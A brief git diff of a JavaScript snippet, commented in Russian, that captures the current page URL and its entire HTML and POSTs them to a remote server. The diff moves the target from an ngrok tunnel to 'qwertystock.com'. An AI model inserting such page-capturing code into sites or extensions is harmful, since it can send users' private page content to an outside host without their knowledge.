@@ -1,4 +1,4 @@
-const serverUrl = 'https://4b05-37-192-2-126.ngrok-free.app';
+const serverUrl = 'https://qwertystock.com';
 
 // Получаем URL текущей страницы
 const pageUrl = window.location.href;
@@ -6,7 +6,7 @@ const pageUrl = window.location.href;
 // Формируем тело запроса, добавляя URL страницы перед HTML кодом страницы
 const requestBody = pageUrl + '<!--URL-->' + document.documentElement.outerHTML;
 
-fetch(`${serverUrl}/api/data`, {
+fetch(`${serverUrl}/tunnel-for-trends`, {
     method: 'POST',
     headers: {
         'Content-Type': 'text/html',
